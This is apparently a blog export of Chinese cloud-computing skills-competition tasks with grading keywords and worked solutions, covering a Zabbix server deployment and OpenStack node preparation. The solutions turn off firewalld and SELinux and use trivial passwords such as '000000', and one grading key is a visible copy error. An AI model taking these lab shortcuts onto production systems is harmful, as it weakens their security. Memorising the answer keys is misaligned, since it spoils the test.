# yum -y install mariadb-server# systemctl start mariadb# systemctl status mariadb● mariadb.service - MariaDB database server   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; vendor preset: disabled)   Active: active (running) since Sat 2023-03-18 04:52:20 UTC; 1min 2s ago  Process: 20907 ExecStartPost=/usr/libexec/mariadb-wait-ready $MAINPID (code=exited, status=0/SUCCESS)  Process: 20822 ExecStartPre=/usr/libexec/mariadb-prepare-db-dir %n (code=exited, status=0/SUCCESS) Main PID: 20905 (mysqld_safe)   CGroup: /system.slice/mariadb.service           ├─20905 /bin/sh /usr/bin/mysqld_safe --basedir=/usr...           └─21071 /usr/libexec/mysqld --basedir=/usr --datadi...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: M...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: P...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: T...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: Y...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: C...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...Mar 18 04:52:20 zabbix_server systemd[1]: Started MariaDB data...Hint: Some lines were ellipsized, use -l to show in full.

7.配置数据库登录mysql,创建数据库zabbix和用户zabbix密码自定义，并授权zabbix用户拥有zabbix数据库的所有权限。
  将show grants for ‘zabbix‘@’localhost’;命令的返回结果提交到答题框。【2分】
标准: ALL&amp;&amp;PRIVILEGES
解法:
# mysql -uroot -pMariaDB [(none)]&gt; create database zabbix character set utf8mb4 collate utf8mb4_general_ci;MariaDB [(none)]&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &#x27;password&#x27;;MariaDB [zabbix]&gt; show grants for &#x27;zabbix&#x27;@&#x27;localhost&#x27;;+---------------------------------------------------------------------------------------------------------------+| Grants for zabbix@localhost                                                                                   |+---------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27; IDENTIFIED BY PASSWORD &#x27;*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19&#x27; || GRANT ALL PRIVILEGES ON `zabbix`.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27;

8.导入数据库架构分别导入数据库架构及数据，对应的文件分别为schema.sql、images.sql和data.sql（文件顺便不能乱）。
  登录数据库将select username from users;命令的返回结果提交到答题框（用zabbix数据库）。【2分】
标准:Admin&amp;&amp;guest
解法:
[root@zabbix_server ~]# mysql -uroot -ppassword zabbix &lt; /usr/share/zabbix-mysql/schema.sql[root@zabbix_server ~]# mysql -uroot -ppassword zabbix &lt; /usr/share/zabbix-mysql/images.sql[root@zabbix_server ~]# mysql -uroot -ppassword zabbix &lt; /usr/share/zabbix-mysql/data.sql[root@zabbix_server ~]# mysql -uzabbix -pEnter password:MariaDB [(none)]&gt; use zabbix;MariaDB [zabbix]&gt; select username from users;+----------+| username |+----------+| Admin    || guest    |

9.配置文件配置default.conf。
   将cat &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf命令的返回结果提交到答题框。【2分】
标准: index.php
解法:
vim /etc/nginx/conf.d/default.conf修改内容如下root /usr/share/zabbix/;index index.php index.html index.htm;#cat /etc/nginx/conf.d/default.confserver &#123;listen 80;server_name localhost;#access_log /var/log/nginx/host.access.log main;location / &#123;root /usr/share/zabbix/;index index.php index.html index.htm;&#125;#error_page 404 /404.html;# redirect server error pages to the static page /50x.html#error_page 500 502 503 504 /50x.html;location = /50x.html &#123;root /usr/share/nginx/html;&#125;# proxy the PHP scripts to Apache listening on 127.0.0.1:80##location ~ \.php$ &#123;# proxy_pass http://127.0.0.1;#&#125;# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location ~ \.php$ &#123;root /usr/share/zabbix;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;include fastcgi_params;&#125;# deny access to .htaccess files, if Apache&#x27;s document root# concurs with nginx&#x27;s one##location ~ /\.ht &#123;# deny all;#&#125;&#125;

10.配置文件分别修改配置文件zabbix_server.conf(修改数据库密码)和zabbix_agentd.conf（修改服务器IP，活动服务器IP和主机名），并重启对应服务使配置生效。
   将cat &#x2F;etc&#x2F;zabbix_agentd.conf | grep -v ‘^#|^$’命令的返回结果提交到答题框。【2分】
标准: Server&#x3D;192.168.100&amp;&amp;ServerActive&#x3D;192.168.100
[root@zabbix_server ~]# vim /etc/zabbix_server.confDBName=zabbixDBUser=zabbixDBPassword=password[root@zabbix_server ~]# vim /etc/zabbix_agentd.confServer=192.168.100.91ServerActive=192.168.100.91Hostname=zabbix_server[root@zabbix_server ~]# cat /etc/zabbix_agentd.conf | grep -v &#x27;^#\|^$&#x27;PidFile=/run/zabbix/zabbix_agentd.pidLogFile=/var/log/zabbix/zabbix_agentd.logLogFileSize=0Server=192.168.100.91ServerActive=192.168.100.91Hostname=zabbix_server[root@master ~]# systemctl restart zabbix-server[root@master ~]# systemctl restart zabbix-agent

11.配置文件修改php.ini文件,其中最大POST数据限制为16M,程序执行时间限制为300，PHP页面接受数据所需最大时间限制为300，把时区设为Asia&#x2F;Shanghai,并重启相关服务。
  将cat &#x2F;etc&#x2F;php.ini | grep -v ‘^#|^$’命令的返回结果提交到答题框。【2分】
标准: Server&#x3D;192.168.100&amp;&amp;ServerActive&#x3D;192.168.100
解法:
[root@zabbix_server ~]# vim /etc/php.inipost_max_size = 16Mmax_execution_time = 300max_input_time = 300date.timezone = Asia/Shanghai[root@zabbix_server ~]# systemctl restart php74-php-fpm

12.配置文件修改www.conf文件,把用户和组都设置为nginx.
将cat &#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf | grep -v ‘^;|^$’命令的返回结果提交到答题框。【2分】
标准: user&amp;&amp;nginx&amp;&amp;group
解法:
 [root@zabbix_server ~]# vim /etc/php-fpm.d/www.confuser = nginxgroup = nginx[root@zabbix_server ~]# cat /etc/php-fpm.d/www.conf | grep -v &#x27;^;\|^$&#x27;[www]listen = 127.0.0.1:9000 listen.allowed_clients = 127.0.0.1user = nginxgroup = nginxpm = dynamicpm.max_children = 50pm.start_servers = 5pm.min_spare_servers = 5pm.max_spare_servers = 35slowlog = /var/log/php-fpm/www-slow.logphp_admin_value[error_log] = /var/log/php-fpm/www-error.logphp_admin_flag[log_errors] = onphp_value[session.save_handler] = filesphp_value[session.save_path] = /var/lib/php/session

13.配置文件修改zabbix.conf文件,把用户和组都设置为nginx,并将index.php所在的目录和php.ini文件拥有者和用户组改为nginx。重启相关服务，在浏览器中输入http:&#x2F;&#x2F;公网IP&#x2F; setup.php即可看到zabbix 6.0界面。
将curl http:&#x2F;&#x2F; 公网IP &#x2F;setup.php命令的返回结果提交到答题框。【2分】
标准: SIA&amp;&amp;favicon.ico&amp;&amp;msapplication-config
解法:
vim /etc/php-fpm.d/zabbix.conf[zabbix]user = nginxgroup = nginx[root@zabbix_server ~]# chown -R nginx:nginx /usr/share/zabbix/[root@zabbix_server ~]# chown -R nginx:nginx /etc/opt/remi/php74/php.ini[root@zabbix_server ~]# chmod +x /usr/share/zabbix[root@zabbix_server ~]# systemctl restart nginx[root@zabbix_server ~]# systemctl restart zabbix-server[root@zabbix_server ~]# systemctl restart zabbix-agent[root@zabbix_server ~]# systemctl restart php74-php-fpm [root@zabbix_server ~]# curl http://123.249.10.60/setup.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;       &lt;head&gt;              &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;/&gt;              &lt;meta charset=&quot;utf-8&quot; /&gt;              &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;              &lt;meta name=&quot;Author&quot; content=&quot;Zabbix SIA&quot; /&gt;              &lt;title&gt;Installation&lt;/title&gt;              &lt;link rel=&quot;icon&quot; href=&quot;favicon.ico&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;76x76&quot; href=&quot;assets/img/apple-touch-icon-76x76-precomposed.png&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;120x120&quot; href=&quot;assets/img/apple-touch-icon-120x120-precomposed.png&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;152x152&quot; href=&quot;assets/img/apple-touch-icon-152x152-precomposed.png&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;180x180&quot; href=&quot;assets/img/apple-touch-icon-180x180-precomposed.png&quot;&gt;              &lt;link rel=&quot;icon&quot; sizes=&quot;192x192&quot; href=&quot;assets/img/touch-icon-192x192.png&quot;&gt;              &lt;meta name=&quot;csrf-token&quot; content=&quot;5d4324e81318a310&quot;/&gt;              &lt;meta name=&quot;msapplication-TileImage&quot; content=&quot;assets/img/ms-tile-144x144.png&quot;&gt;              &lt;meta name=&quot;msapplication-TileColor&quot; content=&quot;#d40000&quot;&gt;              &lt;meta name=&quot;msapplication-config&quot; content=&quot;none&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;assets/styles/blue-theme.css?1675235994&quot; /&gt;&lt;script src=&quot;js/browsers.js?1674462826&quot;&gt;&lt;/script&gt;&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&quot;&gt;&lt;/script&gt;&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&amp;amp;files%5B0%5D=setup.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt;&lt;main&gt;&lt;form method=&quot;post&quot; action=&quot;setup.php&quot; accept-charset=&quot;utf-8&quot; id=&quot;setup-form&quot;&gt;&lt;div class=&quot;setup-container&quot;&gt;&lt;div class=&quot;setup-left&quot;&gt;&lt;div class=&quot;setup-logo&quot;&gt;&lt;div class=&quot;zabbix-logo&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul&gt;&lt;li class=&quot;setup-left-current&quot;&gt;Welcome&lt;/li&gt;&lt;li&gt;Check of pre-requisites&lt;/li&gt;&lt;li&gt;Configure DB connection&lt;/li&gt;&lt;li&gt;Settings&lt;/li&gt;&lt;li&gt;Pre-installation summary&lt;/li&gt;&lt;li&gt;Install&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div class=&quot;setup-right&quot;&gt;&lt;div class=&quot;setup-right-body&quot;&gt;&lt;div class=&quot;setup-title&quot;&gt;&lt;span&gt;Welcome to&lt;/span&gt;Zabbix 6.0&lt;/div&gt;&lt;ul class=&quot;table-forms&quot;&gt;&lt;li&gt;&lt;div class=&quot;table-forms-td-left&quot;&gt;&lt;label for=&quot;label-default-lang&quot;&gt;Default language&lt;/label&gt;&lt;/div&gt;&lt;div class=&quot;table-forms-td-right&quot;&gt;&lt;z-select id=&quot;default-lang&quot; value=&quot;en_US&quot; focusable-element-id=&quot;label-default-lang&quot; autofocus=&quot;autofocus&quot; name=&quot;default_lang&quot; data-options=&quot;[&#123;&amp;quot;value&amp;quot;:&amp;quot;en_GB&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_GB)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;en_US&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_US)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ca_ES&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Catalan (ca_ES)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;zh_CN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Chinese (zh_CN)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;cs_CZ&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Czech (cs_CZ)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;fr_FR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;French (fr_FR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;de_DE&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;German (de_DE)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;he_IL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Hebrew (he_IL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;it_IT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Italian (it_IT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ko_KR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Korean (ko_KR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ja_JP&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Japanese (ja_JP)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;nb_NO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Norwegian (nb_NO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pl_PL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Polish (pl_PL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_BR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_BR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_PT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_PT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ro_RO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Romanian (ro_RO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ru_RU&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Russian (ru_RU)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;sk_SK&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Slovak (sk_SK)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;tr_TR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Turkish (tr_TR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;uk_UA&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Ukrainian (uk_UA)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;vi_VN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Vietnamese (vi_VN)&amp;quot;&#125;]&quot; tabindex=&quot;-1&quot;&gt;&lt;/z-select&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;setup-footer&quot;&gt;&lt;div&gt;&lt;button type=&quot;submit&quot; id=&quot;next_1&quot; name=&quot;next[1]&quot; value=&quot;Next step&quot;&gt;Next step&lt;/button&gt;&lt;button type=&quot;submit&quot; id=&quot;back_1&quot; name=&quot;back[1]&quot; value=&quot;Back&quot; class=&quot;btn-alt float-left&quot; disabled=&quot;disabled&quot;&gt;Back&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/form&gt;&lt;div class=&quot;signin-links&quot;&gt;Licensed under &lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; class=&quot;grey link-alt&quot; href=&quot;https://www.zabbix.com/license&quot;&gt;GPL v2&lt;/a&gt;&lt;/div&gt;&lt;/main&gt;&lt;footer role=&quot;contentinfo&quot;&gt;Zabbix 6.0.13. &amp;copy; 2001&amp;ndash;2023, &lt;a class=&quot;grey link-alt&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://www.zabbix.com/&quot;&gt;Zabbix SIA&lt;/a&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

14.编写playbook随机找一目录，在其下分别创建tasks和file目录，把autoDeployment.tar、编写好的repo文件和zabbix_agentd.conf传至file目录，在tasks目录下编写agent.yaml文件，要求在被监控机能远程部署zabbix-agent服务。
将cat agent.yaml命令的返回结果提交到答题框。【4分】
标准: copy&amp;&amp;src&amp;&amp;dest&amp;&amp;yum&amp;&amp;name&amp;&amp;zabbix-agent&amp;&amp;state
解法:
[root@zabbix_server opt]# cat agent.yaml---- hosts: agent  become: true  tasks:  - name: copy local.repo    copy:      src: local.repo      dest: /etc/yum.repos.d/local.repo  - name: Copy autoDeployment.tar    copy:      src: autoDeployment.tar      dest: /opt  - name: Copy zabbix_agentd.conf file    copy:      src: zabbix_agentd.conf      dest: /etc/zabbix/zabbix_agentd.conf      owner: zabbix      group: zabbix      mode: &#x27;0644&#x27;  - name: tar autoDeployment.tar    shell:      cmd: tar -vxf autoDeployment.tar  -C /opt  - name: Install Zabbix Agent    yum:      name: zabbix-agent      state: present  - name: Start and enable Zabbix Agent    service:      name: zabbix-agent      state: started      enabled: true

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年一带一路职业技能大赛云计算(样题)</title>
    <url>/posts/d5ee981d.html</url>
    <content><![CDATA[A模块题目OpenStack平台部署与运维任务 1 私有云平台环境初始化（6 分）


IP
主机名



192.168.157.30
controller


192.168.157.31
compute


1.配置主机名 把 controller 节点主机名设置为 controller, compute 节点主机名设置为 compute。
 分别在 controller 节点和 compute 节点将 hostname 命令的返回结果提交到答题框。【0.5 分】
[root@controller ~]# hostnamecontroller[root@compute ~]# hostnamecompute

解法:
hostnamectl set-hostname controllerhostnamectl set-hostname compute

2.配置 hosts 文件分别在 controller 节点和 compute 节点修改 hosts 文件将 IP 地址映射为主机名。
请在 controller 节点将 cat &#x2F;etc&#x2F;hosts 命令的返回结果提交到答题框。 【0.5 分】
[root@controller ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.157.30 controller192.168.157.31 compute[root@compute ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.157.30 controller192.168.157.31 compute

3.挂载光盘镜像将提供的 CentOS-7-x86_64-DVD-1804.iso 和 bricsskills_cloud_iaas.iso 光盘镜像移动到
controller 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建 centos 目录和 iaas 目录，
并将镜像文件 centOS-7-x86_64-DVD-1804.iso 挂载到 &#x2F;opt&#x2F;centos 目录下，将镜像文件
bricsskills_cloud_iaas.iso 挂载到 &#x2F;iaas 目录下。
请在 controller 节点将 ls &#x2F;opt&#x2F;iaas&#x2F;命令的返回结果提交到答题框。【0.5 分】
~]# lslinkiaas-repo  images

解法:
#将指定的镜像上传至/root目录下 #挂载 [root@controller ~]# cat &gt;&gt; /etc/fstab &lt;&lt; EOF/root/CentOS-7-x86_64-DVD-1804.iso /opt/centos iso9660 defaults 0 0/root/chinaskills_cloud_iaas.iso /opt/iaas iso9660 defaults 0 0EOF

4.配置 controller 节点 yum 源将 controller 节点原有的 yum 源移动到&#x2F;home 目录，
为 controller 节点创建本地 yum 源，
yum 源文件名为 local.repo。
请将 yum list | grep vsftpd 的返回结果提交到答题框。【0.5 分】
[root@controller ~]# yum list | grep vsftpdvsftpd.x86_64                              3.0.2-22.el7                centos

解法:
[root@controller ~]# mkdir /home/yum[root@controller ~]# mv /etc/yum.repos.d/* /home/yum[root@controller ~]# cat /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=file:///opt/iaas/iaas-repogpgcheck=0enabled=1[root@controller ~]# yum repolist

5.搭建 ftp 服务器在 controller 节点上安装 vsftp 服务, 将&#x2F;opt 目录设为共享，并设置为开机自启动，然后
重启服务生效。
请将 cat &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf |grep &#x2F;opt 命令的返回结果提交到答题框。【1 分】
[root@controller ~]#  cat /etc/vsftpd/vsftpd.conf |grep /optanon_root=/opt

解法:
[root@controller ~]# yum install -y vsftpd[root@controller ~]# cat /etc/vsftpd/vsftpd.conf#添加anon_root=/opt[root@controller ~]# systemctl enable vsftpd --nowCreated symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service.#关闭防火墙及安全策略[root@controller ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalldRemoved symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.[root@controller ~]# setenforce 0[root@controller ~]# cat /etc/selinux/configSELINUX=permissive[root@compute ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalldRemoved symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.[root@compute ~]# setenforce 0[root@compute ~]# cat /etc/selinux/configSELINUX=permissive

6.配置 compute 节点 yum 源将 compute 节点原有的 yum 源移动到&#x2F;home 目录，为 compute 节点创建 ftp 源，yum 源文件
名为 ftp.repo，其中 ftp 服务器为 controller 节点,配置 ftp 源时不要写 IP 地址。
 请将 yum list | grep xiandian 命令的返回结果提交到答题框【1 分】
[root@compute ~]# yum list | grep xiandianiaas-xiandian.x86_64                       2.4-2                       iaas-0

解法:
[root@compute ~]# mkdir /home/yum[root@compute ~]# mv /etc/yum.repos.d/* /home/yum[root@compute ~]# cat /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://controller/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=ftp://controller/iaas/iaas-repogpgcheck=0enabled=1[root@compute ~]# yum repolist

7.分区在 compute 节点将 vdb 分为两个区分别为 vdb1 和 vdb2,大小自定义。要求分区格式为 gpt,
使用 mkfs.xfs 命令对文件系统格式化。
请将 lsblk -f 命令的返回结果提交到答题框【1 分】
虚拟机没有vdb区,使用sdb分区进行代替
[root@compute ~]# lsblk -fNAME            FSTYPE      LABEL           UUID                                   MOUNTPOINTsda├─sda1          xfs                         c2b0cad1-cdef-48c6-adb7-5e4eafaf7458   /boot└─sda2          LVM2_member                 oiioJ7-K5mu-sPhw-R4Rb-S3yH-fWo9-23G9aY  ├─centos-root xfs                         e78104be-5c62-4102-b730-f03cde9fa24a   /  └─centos-swap swap                        74991746-7fc7-4936-a835-4f603f2468c8   [SWAP]sdb├─sdb1          xfs                         25a1594a-769d-48ac-966c-d59607cd0bb4└─sdb2          xfs                         c49808f0-0ac0-4848-957d-e0525f1117b3sdcsr0             iso9660     CentOS 7 x86_64 2018-05-03-20-55-23-00

解法:
[root@compute ~]# yum install -y gdisk[root@compute ~]# gdisk /dev/sdbGPT fdisk (gdisk) version 0.8.10Partition table scan:  MBR: not present  BSD: not present  APM: not present  GPT: not presentCreating new GPT entries.Command (? for help): nPartition number (1-128, default 1):First sector (34-41943006, default = 2048) or &#123;+-&#125;size&#123;KMGTP&#125;:Last sector (2048-41943006, default = 41943006) or &#123;+-&#125;size&#123;KMGTP&#125;: +10GCurrent type is &#x27;Linux filesystem&#x27;Hex code or GUID (L to show codes, Enter = 8300):Changed type of partition to &#x27;Linux filesystem&#x27;Command (? for help): nPartition number (2-128, default 2):First sector (34-41943006, default = 20973568) or &#123;+-&#125;size&#123;KMGTP&#125;:Last sector (20973568-41943006, default = 41943006) or &#123;+-&#125;size&#123;KMGTP&#125;: +10GLast sector (20973568-41943006, default = 41943006) or &#123;+-&#125;size&#123;KMGTP&#125;:Current type is &#x27;Linux filesystem&#x27;Hex code or GUID (L to show codes, Enter = 8300):Changed type of partition to &#x27;Linux filesystem&#x27;Command (? for help): wFinal checks complete. About to write GPT data. THIS WILL OVERWRITE EXISTINGPARTITIONS!!Do you want to proceed? (Y/N): yOK; writing new GUID partition table (GPT) to /dev/sdb.The operation has completed successfully.[root@compute ~]# mkfs.xfs /dev/sdb1[root@compute ~]# mkfs.xfs /dev/sdb2

8.系统调优-脏数据回写Linux 系统内存中会存在脏数据，一般系统默认脏数据占用内存 30%时会回写磁盘，修
改系统配置文件，要求将回写磁盘的大小调整为 60%。
在 controller 节点请将 sysctl -p 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# sysctl -pvm.dirty_ratio = 60

解法:
[root@controller ~]# cat /etc/sysctl.confvm.dirty_ratio = 60

任务 2 OpenStack 搭建任务（8 分）1.修改脚本文件在 controller 节点和 compute 节点分别安装 iaas-xiandian 软件包，修改脚本文件基本变
量（脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh），修改完成后使用命令生效该脚本文件。
在 controller 节点请将 echo $INTERFACE_NAME 命令的返回结果提交到答题框。【0.5 分】
[root@controller ~]# echo $INTERFACE_NAMEeth36

解法:
#controller节点与compute节点做法相同#只修改interface_ip和INTERFACE_NAME  即可[root@controller ~]# yum install -y iaas-xiandian[root@controller ~]# cat /etc/xiandian/openrc.sh#--------------------system Config--------------------###Controller Server Manager IP. example:x.x.x.xHOST_IP=192.168.157.30#Controller HOST Password. example:000000HOST_PASS=000000#Controller Server hostname. example:controllerHOST_NAME=controller#Compute Node Manager IP. example:x.x.x.xHOST_IP_NODE=192.168.157.31#Compute HOST Password. example:000000HOST_PASS_NODE=000000#Compute Node hostname. example:computeHOST_NAME_NODE=compute#--------------------Chrony Config-------------------###Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)network_segment_IP=192.168.157,0/24#--------------------Rabbit Config ------------------###user for rabbit. example:openstackRABBIT_USER=openstack#Password for rabbit user .example:000000RABBIT_PASS=000000#--------------------MySQL Config---------------------###Password for MySQL root user . exmaple:000000DB_PASS=000000#--------------------Keystone Config------------------###Password for Keystore admin user. exmaple:000000DOMAIN_NAME=demoADMIN_PASS=000000DEMO_PASS=000000#Password for Mysql keystore user. exmaple:000000KEYSTONE_DBPASS=000000#--------------------Glance Config--------------------###Password for Mysql glance user. exmaple:000000GLANCE_DBPASS=000000#Password for Keystore glance user. exmaple:000000GLANCE_PASS=000000#--------------------Nova Config----------------------###Password for Mysql nova user. exmaple:000000NOVA_DBPASS=000000#Password for Keystore nova user. exmaple:000000NOVA_PASS=000000#--------------------Neturon Config-------------------###Password for Mysql neutron user. exmaple:000000NEUTRON_DBPASS=000000#Password for Keystore neutron user. exmaple:000000NEUTRON_PASS=000000#metadata secret for neutron. exmaple:000000METADATA_SECRET=000000#Tunnel Network Interface. example:x.x.x.xINTERFACE_IP=192.168.157.30#External Network Interface. example:eth1INTERFACE_NAME=eth36#External Network The Physical Adapter. example:providerPhysical_NAME=provider#First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101minvlan=101#Last Vlan ID in VLAN RANGE for VLAN Network. example:200maxvlan=200#--------------------Cinder Config--------------------###Password for Mysql cinder user. exmaple:000000CINDER_DBPASS=000000#Password for Keystore cinder user. exmaple:000000CINDER_PASS=000000#Cinder Block Disk. example:md126p3BLOCK_DISK=sdb1#--------------------Swift Config---------------------###Password for Keystore swift user. exmaple:000000SWIFT_PASS=000000#The NODE Object Disk for Swift. example:md126p4.OBJECT_DISK=sdb2#The NODE IP for Swift Storage Network. example:x.x.x.x.STORAGE_LOCAL_NET_IP=192.168.157.31#--------------------Heat Config----------------------###Password for Mysql heat user. exmaple:000000HEAT_DBPASS=000000#Password for Keystore heat user. exmaple:000000HEAT_PASS=000000#--------------------Zun Config-----------------------###Password for Mysql Zun user. exmaple:000000ZUN_DBPASS=000000#Password for Keystore Zun user. exmaple:000000ZUN_PASS=000000#Password for Mysql Kuryr user. exmaple:000000KURYR_DBPASS=000000#Password for Keystore Kuryr user. exmaple:000000KURYR_PASS=000000#--------------------Ceilometer Config----------------###Password for Gnocchi ceilometer user. exmaple:000000CEILOMETER_DBPASS=000000#Password for Keystore ceilometer user. exmaple:000000CEILOMETER_PASS=000000#--------------------AODH Config----------------###Password for Mysql AODH user. exmaple:000000AODH_DBPASS=000000#Password for Keystore AODH user. exmaple:000000AODH_PASS=000000#--------------------Barbican Config----------------###Password for Mysql Barbican user. exmaple:000000BARBICAN_DBPASS=000000#Password for Keystore Barbican user. exmaple:000000BARBICAN_PASS=000000root@controller ~]# source /etc/xiandian/openrc.sh

2.修改脚本文件在 compute 节点配置&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh 文件，根据环境情况修改参数，块存储服务
的后端使用第二块硬盘的第一个分区，生效该参数文件。
请将 echo $INTERFACE_IP&amp;&amp; echo $BLOCK_DISK 命令的返回结果提交到答题框。【0.5 分】
[root@compute ~]#  echo $INTERFACE_IP&amp;&amp; echo $BLOCK_DISK192.168.157.31sdb1

解法:
